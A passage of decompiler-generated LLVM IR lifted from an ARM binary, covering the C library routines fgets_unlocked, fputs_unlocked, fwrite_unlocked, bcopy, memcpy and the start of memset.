  %v2_13bc4 = inttoptr i32 %v1_13bc4 to i32*
  %v3_13bc4 = load i32, i32* %v2_13bc4, align 4
  store i32 %v3_13bc4, i32* %r3.global-to-local, align 4
  %v2_13bc8 = add i32 %v1_13bc4, 8
  %v3_13bc8 = inttoptr i32 %v2_13bc8 to i32*
  %v4_13bc8 = load i32, i32* %v3_13bc8, align 4
  %v2_13bcc = and i32 %v3_13bc4, -65
  store i32 %v2_13bcc, i32* %r3.global-to-local, align 4
  %v4_13bd0 = sdiv i32 %v3_13bc4, 256
  store i32 %v4_13bd0, i32* %r1.global-to-local, align 4
  %v3_13bd4 = add i32 %v1_13bc4, 28
  %v4_13bd4 = inttoptr i32 %v3_13bd4 to i32*
  store i32 %v4_13bc8, i32* %v4_13bd4, align 4
  %v1_13bd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13bd8 = trunc i32 %v1_13bd8 to i8
  %v3_13bd8 = load i32, i32* @r6, align 4
  %v4_13bd8 = add i32 %v3_13bd8, 1
  %v5_13bd8 = inttoptr i32 %v4_13bd8 to i8*
  store i8 %v2_13bd8, i8* %v5_13bd8, align 1
  %v0_13bdc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13bdc.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_13bdc = load i32, i32* %r3.global-to-local, align 4
  %v2_13bdc = trunc i32 %v1_13bdc to i8
  %v3_13bdc = load i32, i32* @r6, align 4
  %v4_13bdc = inttoptr i32 %v3_13bdc to i8*
  store i8 %v2_13bdc, i8* %v4_13bdc, align 1
  %v0_13be0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13be0.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13bb8, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_13ba4, %.thread6, %.thread7
  %v2_13be8 = load i32, i32* @global_var_2c5e0.1016, align 4
  store i32 %v2_13be8, i32* %r3.global-to-local, align 4
  %v7_13bec = icmp eq i32 %v2_13be8, 2
  store i1 %v7_13bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13bec, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_13ab4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 90076)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_13b5c, %bb40
  %v0_13c04 = load i32, i32* @r6, align 4
  %v1_13c04 = add i32 %v0_13c04, 32
  %v2_13c04 = inttoptr i32 %v1_13c04 to i32*
  %v3_13c04 = load i32, i32* %v2_13c04, align 4
  store i32 %v3_13c04, i32* @r6, align 4
  %v2_13c08 = icmp eq i32 %v3_13c04, 0
  store i1 %v2_13c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c08, label %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge, label %dec_label_pc_13b5c

dec_label_pc_13c08.dec_label_pc_13c10_crit_edge:  ; preds = %.thread11
  %v0_13c10.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge, %dec_label_pc_13acc
  %v0_13c10 = phi i32 [ %v0_13c10.pre, %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge ], [ %v1_13b4c, %dec_label_pc_13acc ]
  %v1_13c10 = call i32 @_stdio_openlist_dec_use(i32 %v0_13c10)
  store i32 %v1_13c10, i32* %r0.global-to-local, align 4
  %v0_13c54.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13ac0
  %v1_13c18 = inttoptr i32 %.v1_13aac to i8*
  %v2_13c18 = load i8, i8* %v1_13c18, align 1
  %v3_13c18 = zext i8 %v2_13c18 to i32
  %v1_13c1c = and i32 %v3_13c18, 64
  store i32 %v1_13c1c, i32* %r3.global-to-local, align 4
  %v2_13c1c = icmp eq i32 %v1_13c1c, 0
  store i1 %v2_13c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c1c, label %bb41, label %dec_label_pc_13c28

bb41:                                             ; preds = %dec_label_pc_13c18
  br label %bb43

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c18
  %v0_13c28 = call i32 @__stdio_wcommit()
  store i32 %v0_13c28, i32* %r0.global-to-local, align 4
  %v2_13c2c = icmp eq i32 %v0_13c28, 0
  store i1 %v2_13c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c2c, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_13c28
  %v1_13c30 = load i32, i32* %r8.global-to-local, align 4
  %v2_13c30 = inttoptr i32 %v1_13c30 to i32*
  %v3_13c30 = load i32, i32* %v2_13c30, align 4
  store i32 %v3_13c30, i32* %r3.global-to-local, align 4
  %v2_13c34 = add i32 %v1_13c30, 8
  %v3_13c34 = inttoptr i32 %v2_13c34 to i32*
  %v4_13c34 = load i32, i32* %v3_13c34, align 4
  store i32 %v4_13c34, i32* %r1.global-to-local, align 4
  %v2_13c38 = and i32 %v3_13c30, -65
  store i32 %v2_13c38, i32* %r3.global-to-local, align 4
  %v4_13c3c = sdiv i32 %v3_13c30, 256
  %v2_13c40 = trunc i32 %v4_13c3c to i8
  %v4_13c40 = add i32 %v1_13c30, 1
  %v5_13c40 = inttoptr i32 %v4_13c40 to i8*
  store i8 %v2_13c40, i8* %v5_13c40, align 1
  %v0_13c44.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c44.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_13c44 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c44 = load i32, i32* %r8.global-to-local, align 4
  %v3_13c44 = add i32 %v2_13c44, 28
  %v4_13c44 = inttoptr i32 %v3_13c44 to i32*
  store i32 %v1_13c44, i32* %v4_13c44, align 4
  %v1_13c48 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c48 = trunc i32 %v1_13c48 to i8
  %v3_13c48 = load i32, i32* %r8.global-to-local, align 4
  %v4_13c48 = inttoptr i32 %v3_13c48 to i8*
  store i8 %v2_13c48, i8* %v4_13c48, align 1
  %v0_13c4c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c4c.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_13c28
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_13c10, %.thread20
  %v0_13c54 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_13c54.pre, %dec_label_pc_13c10 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_13c54, i32* %r0.global-to-local, align 4
  store i32 %v3_13aa0, i32* @r4, align 4
  ret i32 %v0_13c54

; uselistorder directives
  uselistorder i32 %v0_13c54, { 1, 0 }
  uselistorder i32 %v3_13c04, { 1, 2, 0 }
  uselistorder i32 %v2_13ab4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_2c5ac.1025 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_30928.1003, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ba4, { 1, 0 }
  uselistorder label %dec_label_pc_13b5c, { 1, 0 }
  uselistorder label %dec_label_pc_13acc, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c88 = icmp eq i32 %arg2, 0
  store i1 %v2_13c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_13d10, label %dec_label_pc_13cf4.preheader

dec_label_pc_13cf4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_13cf415 = add i32 %arg2, -1
  store i32 %v1_13cf415, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_13cf421 = icmp eq i32 %arg2, 1
  store i1 %v7_13cf421, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cf421, label %dec_label_pc_13d00, label %dec_label_pc_13ca0

dec_label_pc_13ca0:                               ; preds = %dec_label_pc_13cf4.preheader, %dec_label_pc_13cf4.backedge
  %v1_13cf824.in = phi i32 [ %v0_13cf8.pre, %dec_label_pc_13cf4.backedge ], [ %arg3, %dec_label_pc_13cf4.preheader ]
  %v1_13ca0 = add i32 %v1_13cf824.in, 16
  %v2_13ca0 = inttoptr i32 %v1_13ca0 to i32*
  %v3_13ca0 = load i32, i32* %v2_13ca0, align 4
  store i32 %v3_13ca0, i32* %r2.global-to-local, align 4
  %v1_13ca4 = add i32 %v1_13cf824.in, 24
  %v2_13ca4 = inttoptr i32 %v1_13ca4 to i32*
  %v3_13ca4 = load i32, i32* %v2_13ca4, align 4
  %v3_13ca8 = icmp uge i32 %v3_13ca0, %v3_13ca4
  store i1 %v3_13ca8, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca8 = icmp eq i32 %v3_13ca0, %v3_13ca4
  store i1 %v9_13ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13ca8, label %dec_label_pc_13cc8, label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13ca0
  %v1_13cb0 = inttoptr i32 %v3_13ca0 to i8*
  %v2_13cb0 = load i8, i8* %v1_13cb0, align 1
  %v5_13cb0 = add i32 %v3_13ca0, 1
  store i32 %v5_13cb0, i32* %r2.global-to-local, align 4
  %v2_13cb4 = load i32, i32* @r4, align 4
  %v3_13cb4 = inttoptr i32 %v2_13cb4 to i8*
  store i8 %v2_13cb0, i8* %v3_13cb4, align 1
  %v0_13cb8 = load i32, i32* @r4, align 4
  %v1_13cb8 = inttoptr i32 %v0_13cb8 to i8*
  %v2_13cb8 = load i8, i8* %v1_13cb8, align 1
  %v5_13cb8 = add i32 %v0_13cb8, 1
  store i32 %v5_13cb8, i32* @r4, align 4
  %v2_13cbc = icmp ugt i8 %v2_13cb8, 9
  store i1 %v2_13cbc, i1* %cpsr_c.global-to-local, align 1
  %v7_13cbc = icmp eq i8 %v2_13cb8, 10
  store i1 %v7_13cbc, i1* %cpsr_z.global-to-local, align 1
  %v0_13cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13cc0 = load i32, i32* @r5, align 4
  %v2_13cc0 = add i32 %v1_13cc0, 16
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  store i32 %v0_13cc0, i32* %v3_13cc0, align 4
  br i1 %v7_13cbc, label %dec_label_pc_13d00, label %dec_label_pc_13cf4.backedge

dec_label_pc_13cc8:                               ; preds = %dec_label_pc_13ca0
  %v1_13cf824 = inttoptr i32 %v1_13cf824.in to i8*
  %v3_13cc8 = call i32 @getc_unlocked(i8* %v1_13cf824)
  %v4_13cc8 = trunc i32 %v3_13cc8 to i8
  %v5_13ccc = icmp eq i8 %v4_13cc8, -1
  store i1 %v5_13ccc, i1* %cpsr_c.global-to-local, align 1
  %v10_13ccc = icmp eq i32 %v3_13cc8, -1
  store i1 %v10_13ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_13ccc, label %dec_label_pc_13cd4, label %dec_label_pc_13cf0

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13cc8
  %v0_13cd4 = load i32, i32* @r5, align 4
  %v1_13cd4 = inttoptr i32 %v0_13cd4 to i8*
  %v2_13cd4 = load i8, i8* %v1_13cd4, align 1
  %v1_13cd8 = and i8 %v2_13cd4, 8
  %v2_13cd8 = icmp eq i8 %v1_13cd8, 0
  store i1 %v2_13cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cd8, label %dec_label_pc_13d00, label %dec_label_pc_13d10

dec_label_pc_13cf0:                               ; preds = %dec_label_pc_13cc8
  %v3_13ce4 = load i32, i32* @r4, align 4
  %v4_13ce4 = inttoptr i32 %v3_13ce4 to i8*
  store i8 %v4_13cc8, i8* %v4_13ce4, align 1
  %v0_13ce8 = load i32, i32* @r4, align 4
  %v1_13ce8 = inttoptr i32 %v0_13ce8 to i8*
  %v2_13ce8 = load i8, i8* %v1_13ce8, align 1
  %v5_13ce8 = add i32 %v0_13ce8, 1
  store i32 %v5_13ce8, i32* @r4, align 4
  %v2_13cec = icmp ugt i8 %v2_13ce8, 9
  store i1 %v2_13cec, i1* %cpsr_c.global-to-local, align 1
  %v7_13cec = icmp eq i8 %v2_13ce8, 10
  store i1 %v7_13cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cec, label %dec_label_pc_13d00, label %dec_label_pc_13cf4.backedge

dec_label_pc_13cf4.backedge:                      ; preds = %dec_label_pc_13cf0, %dec_label_pc_13cb0
  %v0_13cf4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_13cf8.pre = load i32, i32* @r5, align 4
  %v1_13cf4 = add i32 %v0_13cf4.pre, -1
  store i32 %v1_13cf4, i32* %r6.global-to-local, align 4
  %v2_13cf4 = icmp ne i32 %v0_13cf4.pre, 0
  store i1 %v2_13cf4, i1* %cpsr_c.global-to-local, align 1
  %v7_13cf4 = icmp eq i32 %v0_13cf4.pre, 1
  store i1 %v7_13cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cf4, label %dec_label_pc_13d00, label %dec_label_pc_13ca0

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13cf4.preheader, %dec_label_pc_13cf0, %dec_label_pc_13cf4.backedge, %dec_label_pc_13cb0, %dec_label_pc_13cd4
  %v0_13d00 = load i32, i32* @r4, align 4
  %v1_13d00 = load i32, i32* %r7.global-to-local, align 4
  %v3_13d00 = icmp uge i32 %v0_13d00, %v1_13d00
  store i1 %v3_13d00, i1* %cpsr_c.global-to-local, align 1
  %v9_13d00 = icmp eq i32 %v0_13d00, %v1_13d00
  store i1 %v9_13d00, i1* %cpsr_z.global-to-local, align 1
  %v2_13d04 = xor i1 %v9_13d00, true
  %v3_13d04 = and i1 %v3_13d00, %v2_13d04
  br i1 %v3_13d04, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_13d00
  %v7_13d08 = inttoptr i32 %v0_13d00 to i8*
  store i8 0, i8* %v7_13d08, align 1
  %v0_13d0c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_13d0c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13d00, %bb
  %v1_13d0c = phi i1 [ %v1_13d0c.pre, %bb ], [ %v9_13d00, %dec_label_pc_13d00 ]
  %v0_13d0c = phi i1 [ %v0_13d0c.pre, %bb ], [ %v3_13d00, %dec_label_pc_13d00 ]
  %v2_13d0c = xor i1 %v1_13d0c, true
  %v3_13d0c = and i1 %v0_13d0c, %v2_13d0c
  br i1 %v3_13d0c, label %.dec_label_pc_13d14_crit_edge, label %dec_label_pc_13d10

.dec_label_pc_13d14_crit_edge:                    ; preds = %.thread7
  %v0_13d14.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d14

dec_label_pc_13d10:                               ; preds = %entry, %dec_label_pc_13cd4, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %.dec_label_pc_13d14_crit_edge, %dec_label_pc_13d10
  %v0_13d14 = phi i32 [ %v0_13d14.pre, %.dec_label_pc_13d14_crit_edge ], [ 0, %dec_label_pc_13d10 ]
  ret i32 %v0_13d14

; uselistorder directives
  uselistorder i1 %v9_13d00, { 1, 0, 2 }
  uselistorder i32 %v1_13d00, { 1, 0 }
  uselistorder i32 %v0_13d00, { 0, 2, 1 }
  uselistorder i32 %v0_13cf4.pre, { 2, 0, 1 }
  uselistorder i1 %v2_13cd8, { 1, 0 }
  uselistorder i32 %v3_13ca0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13cf824.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_13d14, { 1, 0 }
  uselistorder label %dec_label_pc_13d10, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13d00, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_13ca0, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13d1c = load i32, i32* @r4, align 4
  store i32 %v3_13d1c, i32* %stack_var_-16, align 4
  %v6_13d1c = load i32, i32* @r5, align 4
  %v9_13d1c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13d28 = call i32 @strlen(i8* %arg1)
  store i32 %v3_13d28, i32* @r6, align 4
  %v0_13d30 = load i32, i32* @r5, align 4
  %v0_13d34 = load i32, i32* @r4, align 4
  %v5_13d40 = inttoptr i32 %v0_13d30 to i8*
  %v6_13d40 = call i32 @__GI_fwrite_unlocked(i32 %v0_13d34, i32 1, i32 %v3_13d28, i8* %v5_13d40)
  %v1_13d44 = load i32, i32* @r6, align 4
  %v9_13d44 = icmp eq i32 %v6_13d40, %v1_13d44
  br i1 %v9_13d44, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_13d4c = phi i32 [ %v6_13d40, %entry ], [ -1, %bb ]
  %v2_13d4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d4c, i32* @r4, align 4
  store i32 %v6_13d1c, i32* @r5, align 4
  store i32 %v9_13d1c, i32* @r6, align 4
  ret i32 %v14_13d4c

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_13d50 = load i32, i32* @r6, align 4
  %v12_13d50 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13d58 = load i8, i8* %arg4, align 1
  %v4_13d58 = zext i8 %v3_13d58 to i32
  %v1_13d5c = and i32 %v4_13d58, 192
  store i32 %v1_13d5c, i32* %r3.global-to-local, align 4
  %v2_13d60 = icmp eq i32 %v1_13d5c, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_13d60, label %dec_label_pc_13d88, label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %entry
  %v4_13d7c = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_13d80 = icmp eq i32 %v4_13d7c, 0
  br i1 %v2_13d80, label %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge, label %dec_label_pc_13df0

dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge:  ; preds = %dec_label_pc_13d7c
  %v0_13d88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge, %entry
  %v0_13d901 = phi i32 [ %v0_13d88.pre, %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge ], [ %arg2, %entry ]
  %v2_13d88 = icmp eq i32 %v0_13d901, 0
  br i1 %v2_13d88, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13d88
  br label %dec_label_pc_13df0

bb:                                               ; preds = %dec_label_pc_13d88
  %v1_13d8c = load i32, i32* @r6, align 4
  %v3_13d8c = icmp eq i32 %v1_13d8c, 0
  br i1 %v3_13d8c, label %dec_label_pc_13df0, label %dec_label_pc_13d9c

dec_label_pc_13d9c:                               ; preds = %bb
  %v2_13d9c = udiv i32 -1, %v0_13d901
  %v0_13da4 = load i32, i32* @r4, align 4
  store i32 %v0_13da4, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_13d8c, %v2_13d9c
  br i1 %tmp10, label %dec_label_pc_13dc8, label %dec_label_pc_13db0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13d9c
  %v0_13da8 = load i32, i32* @r7, align 4
  %v2_13db0 = mul i32 %v1_13d8c, %v0_13d901
  %v4_13db4 = call i32 @__stdio_fwrite(i32 %v0_13da8, i32 %v2_13db0, i32 %v0_13da4)
  %v0_13db8 = load i32, i32* @r5, align 4
  %v2_13dbc = udiv i32 %v4_13db4, %v0_13db8
  store i32 %v2_13dbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13dc8:                               ; preds = %dec_label_pc_13d9c
  %v1_13dc8 = inttoptr i32 %v0_13da4 to i32*
  %v2_13dc8 = load i32, i32* %v1_13dc8, align 4
  %v1_13dcc = or i32 %v2_13dc8, 8
  store i32 %v1_13dcc, i32* %r3.global-to-local, align 4
  %v3_13dd0 = sdiv i32 %v2_13dc8, 256
  store i32 %v3_13dd0, i32* %r2.global-to-local, align 4
  %v1_13dd4 = trunc i32 %v3_13dd0 to i8
  %v3_13dd4 = add i32 %v0_13da4, 1
  %v4_13dd4 = inttoptr i32 %v3_13dd4 to i8*
  store i8 %v1_13dd4, i8* %v4_13dd4, align 1
  %v0_13dd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13dd8 = trunc i32 %v0_13dd8 to i8
  %v2_13dd8 = load i32, i32* @r4, align 4
  %v3_13dd8 = inttoptr i32 %v2_13dd8 to i8*
  store i8 %v1_13dd8, i8* %v3_13dd8, align 1
  %v0_13ddc = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_13de8 = inttoptr i32 %v0_13ddc to i32*
  store i32 22, i32* %v2_13de8, align 4
  %v0_13df4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13df0:                               ; preds = %.thread, %dec_label_pc_13d7c, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13dc8, %dec_label_pc_13db0, %dec_label_pc_13df0
  %v0_13df4 = phi i32 [ %v0_13df4.pre, %dec_label_pc_13dc8 ], [ %v2_13dbc, %dec_label_pc_13db0 ], [ 0, %dec_label_pc_13df0 ]
  store i32 %v9_13d50, i32* @r6, align 4
  store i32 %v12_13d50, i32* @r7, align 4
  ret i32 %v0_13df4

; uselistorder directives
  uselistorder i32 %v3_13dd0, { 1, 0 }
  uselistorder i32 %v1_13d8c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %dec_label_pc_13df4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13df0, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_13e0c = inttoptr i32 %arg2 to i8*
  %v3_13e0c = call i32 @_memcpy(i8* %v2_13e0c, i32 %arg1)
  ret i32 %v3_13e0c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_13e10 = load i32, i32* @r0, align 4
  %v1_13e10 = load i32, i32* @r1, align 4
  %v2_13e10 = inttoptr i32 %v0_13e10 to i8*
  %v3_13e10 = call i32 @_memcpy(i8* %v2_13e10, i32 %v1_13e10)
  ret i32 %v3_13e10
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_13e24 = load i32, i32* @r2, align 4
  %v8_13e24 = icmp eq i32 %v0_13e24, 8
  store i1 %v8_13e24, i1* %cpsr_z.global-to-local, align 1
  %v5_13e28 = icmp slt i32 %v0_13e24, 8
  br i1 %v5_13e28, label %dec_label_pc_13e88, label %dec_label_pc_13e2c

dec_label_pc_13e2c:                               ; preds = %entry
  %v4_13e2c = mul i32 %arg2, 256
  %v5_13e2c = or i32 %v4_13e2c, %arg2
  %v4_13e30 = mul i32 %v5_13e2c, 65536
  %v5_13e30 = or i32 %v4_13e30, %v5_13e2c
  store i32 %v5_13e30, i32* %r1.global-to-local, align 4
  %v1_13e3457 = urem i32 %tmp, 4
  %v2_13e3458 = icmp eq i32 %v1_13e3457, 0
  store i1 %v2_13e3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13e3458, label %dec_label_pc_13e44, label %bb

bb:                                               ; preds = %dec_label_pc_13e2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13e2c ]
  %v3_13e3859 = phi i32 [ %v6_13e38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13e2c ]
  %v4_13e38 = inttoptr i32 %v3_13e3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13e38, align 1
  %v5_13e38 = load i32, i32* %r3.global-to-local, align 4
  %v6_13e38 = add i32 %v5_13e38, 1
  store i32 %v6_13e38, i32* %r3.global-to-local, align 4
  %v0_13e3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13e48.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13e3c.pr, label %dec_label_pc_13e44, label %.thread

.thread:                                          ; preds = %bb
  %v2_13e3c = add i32 %v0_13e48.pr.pre, -1
  store i32 %v2_13e3c, i32* @r2, align 4
  %v1_13e34 = urem i32 %v6_13e38, 4
  %v2_13e34 = icmp eq i32 %v1_13e34, 0
  store i1 %v2_13e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e34, label %dec_label_pc_13e44, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13e38.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13e38.pre to i8
  br label %bb

dec_label_pc_13e44:                               ; preds = %.thread, %bb, %dec_label_pc_13e2c
  %v0_13e5028 = phi i32 [ %tmp, %dec_label_pc_13e2c ], [ %v6_13e38, %bb ], [ %v6_13e38, %.thread ]
  %v0_13e48.pr = phi i32 [ %v0_13e24, %dec_label_pc_13e2c ], [ %v0_13e48.pr.pre, %bb ], [ %v2_13e3c, %.thread ]
  %v0_13e44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13e44, i32* @ip, align 4
  %v8_13e4810 = icmp eq i32 %v0_13e48.pr, 8
  store i1 %v8_13e4810, i1* %cpsr_z.global-to-local, align 1
  %v5_13e4c11 = icmp slt i32 %v0_13e48.pr, 8
  br i1 %v5_13e4c11, label %dec_label_pc_13e88, label %dec_label_pc_13e50.preheader

dec_label_pc_13e50.preheader:                     ; preds = %dec_label_pc_13e44
  %v1_13e5046 = inttoptr i32 %v0_13e5028 to i32*
